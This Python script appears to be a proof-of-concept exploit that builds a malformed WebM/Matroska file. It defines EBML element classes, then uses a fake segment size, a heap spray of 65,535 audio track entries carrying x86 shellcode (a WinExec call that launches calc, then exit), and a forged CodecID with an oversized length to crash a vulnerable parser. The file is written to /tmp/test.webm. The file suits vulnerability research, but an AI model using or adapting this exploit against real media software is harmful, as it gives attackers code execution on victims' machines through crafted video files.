import struct


class PayloadSize():
    def __init__(self, v):
        self.value = v

    def __str__(self):
        # Size fields can be written as 1 to 8 bytes, depending on the value.
        # For simplicity, we write all sizes either as 4 or 8 bytes.
        if self.value <= 0x7f:
            return struct.pack(">B", 0x80|self.value)
        elif self.value <= (1 << 28) - 2:
            # The first byte has upper bits 0001, remaining bits are size in big endian.
            return struct.pack(">L", (1 << 28) | self.value)
        else:
            # The first byte has upper bits 0000 0001, remaining bits are size in big endian.
            return struct.pack(">LL", (1 << 24) | (self.value / 4294967296), self.value % 4294967296)


class UnknownPayloadSize(object):
    def __init__(self, v):
        self.value = v

    def __str__(self):
        return struct.pack(">Q", 0x0100000000000000|self.value)

class MatroskaElement:
    def __init__(self):
        self.size = PayloadSize(-1)

    def getTag(self):
        if self.TAG <= 0xFF:
            return struct.pack(">B", self.TAG)
        elif self.TAG <= 0xFFFF:
            return struct.pack(">H", self.TAG)
        elif self.TAG <= 0xFFFFFF:
            return struct.pack(">L", self.TAG)[1:]
        elif self.TAG <= 0xFFFFFFFF:
            return struct.pack(">L", self.TAG)

class Container(MatroskaElement):
    def __init__(self):
        MatroskaElement.__init__(self)
        self.elements = []

    def add(self, e):
        self.elements.append(e)

    def getSize(self):
        return PayloadSize(len(self.getElementsAsStr()))

    def getElementsAsStr(self):
        return ''.join([str(e) for e in self.elements])

    def __str__(self):
        return self.getTag() + str(self.getSize()) + self.getElementsAsStr()


class TopLevelContainer(Container):
    #The element with unknown size MUST be an element
    #with an element list as data payload. The end of the element list is
    #determined by the ID of the element. When an element that isn't a
    #sub-element of the element with unknown size arrives, the element
    #list is ended.
    #Since the highest value is used for unknown size the effective
    #maximum data size is 2^56-2, using variable size integer width 8.
    def getSize(self):
        return UnknownPayloadSize(len(self.getElementsAsStr()))

class Uint(MatroskaElement):
    def __init__(self, value):
        MatroskaElement.__init__(self)
        self.value = value

    def getSize(self):
        return PayloadSize(len(self.getValueAsStr()))

    def getValueAsStr(self):
        if self.value <= 0xFF:
            return struct.pack(">B", self.value)
        elif self.value <= 0xFFFF:
            return struct.pack(">H", self.value)
        elif self.value <= 0xFFFFFF:
            return struct.pack(">L", self.value)[1:]
        elif self.value <= 0xFFFFFFFF:
            return struct.pack(">L", self.value)

    def __str__(self):
        return self.getTag() + str(self.getSize()) + self.getValueAsStr()

class String(MatroskaElement):
    def __init__(self, value):
        MatroskaElement.__init__(self)
        self.value = value

    def getSize(self):
        return PayloadSize(len(self.value))

    def __str__(self):
        return self.getTag() + str(self.getSize()) + self.value


class Binary(String):
    pass

class RootContainer(Container):
    def __str__(self):
        return ''.join([str(e) for e in self.elements])

####################
class EBML(TopLevelContainer):
    TAG = 0x1a45dfa3

class Segment(TopLevelContainer):
    TAG = 0x18538067

class Info(TopLevelContainer):
    TAG = 0x1549a966

class EBMLVersion(Uint):
    TAG = 0x4286

class EBMLReadVersion(Uint):
    TAG = 0x42F7

class EBMLMaxIDLength(Uint):
    TAG = 0x42F2

class EBMLMaxSizeLength(Uint):
    TAG = 0x42f3

class DocType(String):
    TAG = 0x4282

class DocTypeVersion(Uint):
    TAG = 0x4287

class DocTypeReadVersion(Uint):
    TAG = 0x4285

class SeekHead(Container):
    TAG = 0x114d9b74

class Seek(Container):
    TAG = 0x4dbb

class SeekID(Binary):
    TAG = 0x53ab

class SeekPosition(Uint):
    TAG = 0x53ac

class SegmentUID(Binary):
    TAG = 0x73a4

class SegmentFilename(String):
    TAG = 0x7384

class PrevUID(Binary):
    TAG = 0x3cb923

class PrevFilename(Binary):
    TAG = 0x3c83ab

class NextUID(Binary):
    TAG = 0x3eb923

class NextFilename(String):
    TAG = 0x3e83bb

class TimecodeScale(Uint):
    TAG = 0x2ad7b1

#class Duration(Float)
#   TAG = 0x4489

#class DateUTC(MatroskaDate)
#   TAG = 0x4461

class Title(String):
    TAG = 0x7ba9

class MuxingApp(String):
    TAG = 0x4d80

class WritingApp(String):
    TAG = 0x5741

class Tracks(Container):
    TAG = 0x1654ae6b

class TrackEntry(Container):
    TAG = 0xae

class TrackNumber(Uint):
    TAG = 0xd7

class TrackUID(Uint):
    TAG = 0x73c5

class TrackType(Uint):
    TAG = 0x83

class FlagEnabled(Uint):
    TAG = 0xb9

class FlagDefault(Uint):
    TAG = 0x88

class FlagLacing(Uint):
    TAG = 0x9c

class MinCache(Uint):
    TAG = 0x6de7

class MaxCache(Uint):
    TAG = 0x6df8

class DefaultDuration(Uint):
    TAG = 0x23e383

#class TrackTimecodeScale()
#   TAG = 23314f

class Name(String):
    TAG = 0x536e

class Language(String):
    TAG = 0x22b59c

class CodecID(String):
    TAG = 0x86

class CodecPrivate(Binary):
    TAG = 0x63a2

class CodecName(Binary):
    TAG = 0x258688

class CodecSettings(String):
    TAG = 0x03a9697

class CodecInfoURL(String):
    TAG = 0x3b4040

class CodecDownloadURL(String):
    TAG = 0x26b240

class CodecDecodeAll(Uint):
    TAG = 0xaa

class TrackOverlay(Uint):
    TAG = 0x6fab

class Audio(Container):
    TAG = 0xe1

#class SamplingFrequency(float)
#    TAG = 0xb5

#class OutputSamplingFrequency(float)
#    TAG = 0x78b5

class Channels(Uint):
    TAG = 0x94

class ChannelPositions(Binary):
    TAG = 0x7d7b

class BitDepth(Uint):
    TAG = 0x6264


########################
#Trigger crash

class FakeCodecID(MatroskaElement):
    def __init__(self, payload):
        MatroskaElement.__init__(self)
        self.payload = payload

    def __str__(self):
        return "\x86" + "\x05\x56\x00\x00\x00\x50" + self.payload

class FakeSegment(Segment):
    def getSize(self):
        return UnknownPayloadSize(0xffff)


#########################
import binascii

root = RootContainer()
ebml = EBML()
ebml.add(EBMLVersion(1))
ebml.add(EBMLReadVersion(1))
ebml.add(EBMLMaxIDLength(4))
ebml.add(EBMLMaxSizeLength(8))
ebml.add(DocType("webm"))
ebml.add(DocTypeVersion(4))
ebml.add(DocTypeReadVersion(2))

root.add(ebml)

seek0 = Seek()
seek0.add(SeekID("\x15\x49\xa9\x66"))
seek0.add(SeekPosition(229))

seek1 = Seek()
seek1.add(SeekID("\x16\x54\xae\x6b"))
seek1.add(SeekPosition(0x1000000))

seekhead = SeekHead()
seekhead.add(seek0)
seekhead.add(seek1)

info = Info()
info.add(TimecodeScale(1000000))
info.add(MuxingApp("A"*0x100))
info.add(WritingApp("Lavf57.56.101"))
#info.add(Duration(1006.0))
root.add(info)


tracks = Tracks()

fakeSegment = FakeSegment()
fakeSegment.add(seekhead)
root.add(fakeSegment)

#Heap spray!
shellcode =  "\xC7\x05\xE8\xEE\xD7\x00\x63\x61\x6C\x63"   # MOV DWORD PTR DS:[0D7EEE8],636C6163
shellcode += "\x31\xFF"                                   # XOR EDI,EDI
shellcode += "\x47"                                       # INC EDI
shellcode += "\x57"                                       # PUSH EDI
shellcode += "\x68\xE8\xEE\xD7\x00"                       # PUSH OFFSET 00D7EEE8
shellcode += "\xFF\x15\x00\x72\xAE\x00"                   # CALL DWORD PTR DS:[<&KERNEL32.WinExec>]
shellcode += "\x6A\x01"                                   # PUSH 1
shellcode += "\xFF\x15\xA0\x7F\xAE\x00"                   # CALL DWORD PTR DS:[<&MSVCR80.exit>]

for i in range(0xffff):
    audio = Audio()
    audio.add(ChannelPositions(("\x0C"*0x800 + shellcode + "\x0C"*(0x200-len(shellcode)))))

    trackEntry = TrackEntry()
    trackEntry.add(TrackNumber(i))
    trackEntry.add(TrackUID(i))
    trackEntry.add(audio)

    tracks.add(trackEntry)


#trackEntry2 = TrackEntry()
#trackEntry2.add(TrackNumber(2))
#trackEntry2.add(TrackUID(2))
#trackEntry2.add(audio)


trackEntry = TrackEntry()
trackEntry.add(TrackNumber(i+1))
trackEntry.add(TrackUID(i+1))
trackEntry.add(FlagLacing(0))

#CRASH!
trackEntry.add(FakeCodecID("\x0C" * 0x100000))
tracks.add(trackEntry)

#Tracks (size = 162, ofs = 344): first child ofs = 356
#   TrackEntry (size = 55, ofs = 356): first child ofs = 365
#    TrackNumber (size = 1, ofs = 365): int = 1
#     (size = 1, ofs = 368): int = 1
#     (size = 1, ofs = 372): int = 0
#     (size = 65535, ofs = 375):



root.add(tracks)


#print binascii.hexlify(str(root))

fd = open("/tmp/test.webm", "wb")
fd.write(str(root))
fd.close()


